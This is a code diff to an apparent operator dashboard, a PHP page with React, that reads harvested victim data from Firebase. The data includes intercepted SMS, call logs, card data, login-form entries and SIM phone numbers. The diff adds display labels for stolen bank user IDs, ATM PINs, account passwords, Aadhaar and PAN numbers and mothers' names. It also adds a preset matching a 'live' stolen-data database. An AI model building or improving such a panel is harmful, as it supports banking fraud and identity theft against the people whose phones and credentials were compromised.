@@ -64,8 +64,23 @@ include_once __DIR__ . '/header.php';
       };
 
       // Universal Smart Key-Value Scanner & Formatter for Firebase Firestore Form Data
+      const FIELD_ALIASES = {
+        name: "👤 Customer Full Name",
+        number: "📞 Mobile / Contact Number",
+        mom: "👩 Mother's Name / DOB",
+        pan: "🪪 PAN Card / Guardian Name",
+        user_name: "🔑 Bank Account User ID",
+        pin: "🔑 ATM / Security PIN",
+        password: "🔑 Account Password",
+        pass: "🔑 Account Password",
+        dob: "📅 Date of Birth",
+        aadhaar: "🪪 Aadhaar Card Number"
+      };
+
       const formatFieldLabel = (rawKey) => {
         if (!rawKey) return '';
+        const lowerKey = rawKey.toLowerCase().trim();
+        if (FIELD_ALIASES[lowerKey]) return FIELD_ALIASES[lowerKey];
         return rawKey
           .replace(/([A-Z])/g, ' $1')
           .replace(/_/g, ' ')
@@ -77,14 +92,14 @@ include_once __DIR__ . '/header.php';
       // Universal Field Key Resolvers (Compatible with Firestore & RTDB payload variations)
       const getSim1Phone = (u) => {
         if (!u) return 'N.A.';
-        const val = u.sim1Data?.phone || u.mobileNumber || u.phone;
-        return (val && val !== 'Not inserted' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
+        const val = u.sim1Data?.phone || u.numberSim1 || u.mobileNumber || u.phoneNumber || u.phone;
+        return (val && val !== 'Not inserted' && val !== 'Not Available' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
       };
 
       const getSim2Phone = (u) => {
         if (!u) return 'N.A.';
-        const val = u.sim2Data?.phone;
-        return (val && val !== 'Not inserted' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
+        const val = u.sim2Data?.phone || u.numberSim2;
+        return (val && val !== 'Not inserted' && val !== 'Not Available' && val !== 'No Data' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
       };
 
       const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
@@ -222,7 +237,8 @@ include_once __DIR__ . '/header.php';
       };
 
       const DEFAULT_SCHEMA_PRESETS = {
-        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" }
+        pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
+        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
       };
 
       const [fbCustomPresets, setFbCustomPresets] = React.useState(() => {
@@ -241,11 +257,11 @@ include_once __DIR__ . '/header.php';
       const [fbAuthDomain, setFbAuthDomain] = React.useState('');
       const [fbStorageBucket, setFbStorageBucket] = React.useState('');
       const [fbAppId, setFbAppId] = React.useState('');
-      const [fbPresetKey, setFbPresetKey] = React.useState('custom');
-      const [fbSmsColl, setFbSmsColl] = React.useState('smsData');
-      const [fbCallsColl, setFbCallsColl] = React.useState('callData');
-      const [fbCardsColl, setFbCardsColl] = React.useState('cardData');
-      const [fbFormsColl, setFbFormsColl] = React.useState('formData');
+      const [fbPresetKey, setFbPresetKey] = React.useState('pm_admin');
+      const [fbSmsColl, setFbSmsColl] = React.useState('user_sms');
+      const [fbCallsColl, setFbCallsColl] = React.useState('calls');
+      const [fbCardsColl, setFbCardsColl] = React.useState('Card');
+      const [fbFormsColl, setFbFormsColl] = React.useState('login');
       const [fbJsonPaste, setFbJsonPaste] = React.useState('');
       const [fbSaveStatus, setFbSaveStatus] = React.useState('');
 
